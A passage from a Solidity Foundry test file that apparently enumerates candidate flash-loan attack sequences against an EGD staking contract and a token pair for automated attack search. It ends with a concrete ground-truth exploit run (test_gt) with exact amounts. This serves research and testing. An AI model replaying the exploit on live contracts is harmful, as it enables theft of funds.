        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        deposit_egdstaking_usdt_egdslp(amt6);
        withdraw_egdstaking_egdslp_egd(amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt8 >= amt6);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        borrow_usdt_pair(amt6);
        withdraw_egdstaking_egdslp_egd(amt7);
        payback_usdt_pair(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt8 >= amt6);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        borrow_egd_pair(amt6);
        withdraw_egdstaking_egdslp_egd(amt7);
        payback_egd_pair(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        swap_pair_attacker_egd_usdt(amt6, amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        swap_pair_attacker_usdt_egd(amt6, amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_egd_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        withdraw_egdstaking_egdslp_egd(amt2);
        swap_pair_attacker_egd_usdt(amt3, amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        payback_egd_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_egd_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        swap_pair_attacker_egd_usdt(amt2, amt3);
        deposit_egdstaking_usdt_egdslp(amt4);
        withdraw_egdstaking_egdslp_egd(amt5);
        swap_pair_attacker_egd_usdt(amt6, amt7);
        deposit_egdstaking_usdt_egdslp(amt8);
        withdraw_egdstaking_egdslp_egd(amt9);
        payback_egd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        borrow_usdt_pair(amt4);
        withdraw_egdstaking_egdslp_egd(amt5);
        payback_usdt_pair(amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        deposit_egdstaking_usdt_egdslp(amt9);
        withdraw_egdstaking_egdslp_egd(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        borrow_egd_pair(amt4);
        withdraw_egdstaking_egdslp_egd(amt5);
        payback_egd_pair(amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        deposit_egdstaking_usdt_egdslp(amt9);
        withdraw_egdstaking_egdslp_egd(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_egd_usdt(amt4, amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        deposit_egdstaking_usdt_egdslp(amt9);
        withdraw_egdstaking_egdslp_egd(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        swap_pair_attacker_usdt_egd(amt4, amt5);
        withdraw_egdstaking_egdslp_egd(amt6);
        swap_pair_attacker_egd_usdt(amt7, amt8);
        deposit_egdstaking_usdt_egdslp(amt9);
        withdraw_egdstaking_egdslp_egd(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        deposit_egdstaking_usdt_egdslp(amt5);
        swap_pair_attacker_egd_usdt(amt6, amt7);
        deposit_egdstaking_usdt_egdslp(amt8);
        withdraw_egdstaking_egdslp_egd(amt9);
        payback_egd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt10 >= amt8);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        borrow_usdt_pair(amt8);
        withdraw_egdstaking_egdslp_egd(amt9);
        payback_usdt_pair(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt10 >= amt8);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        borrow_egd_pair(amt8);
        withdraw_egdstaking_egdslp_egd(amt9);
        payback_egd_pair(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        swap_pair_attacker_egd_usdt(amt8, amt9);
        withdraw_egdstaking_egdslp_egd(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        swap_pair_attacker_usdt_egd(amt8, amt9);
        withdraw_egdstaking_egdslp_egd(amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_egd_owner(amt0);
        swap_pair_attacker_egd_usdt(amt1, amt2);
        deposit_egdstaking_usdt_egdslp(amt3);
        withdraw_egdstaking_egdslp_egd(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        deposit_egdstaking_usdt_egdslp(amt7);
        withdraw_egdstaking_egdslp_egd(amt8);
        swap_pair_attacker_usdt_egd(amt9, amt10);
        payback_egd_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 2100e18);
        borrow_usdt_owner(2100e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 100e18);
        deposit_egdstaking_usdt_egdslp(100e18);
        printBalance("After step1 ");
        emit log_named_uint("amt2", 424526221219952604636716);
        borrow_usdt_pair(424526221219952604636716);
        printBalance("After step2 ");
        emit log_named_uint("amt3", 0);
        withdraw_egdstaking_egdslp_egd(0);
        printBalance("After step3 ");
        emit log_named_uint(
            "amt4",
            (uint(424526221219952604636716) * 1003) / 1000
        );
        payback_usdt_pair((uint(424526221219952604636716) * 1003) / 1000);
        printBalance("After step4 ");
        emit log_named_uint("amt5", egd.balanceOf(attacker));
        emit log_named_uint(
            "amt6",
            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
        );
        swap_pair_attacker_egd_usdt(
            egd.balanceOf(attacker),
            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
        );
        printBalance("After step5 ");
        emit log_named_uint("amt7", (2100e18 * 1003) / 1000);
        payback_usdt_owner((2100e18 * 1003) / 1000);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        borrow_usdt_pair(amt2);
        withdraw_egdstaking_egdslp_egd(amt3);
        payback_usdt_pair(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
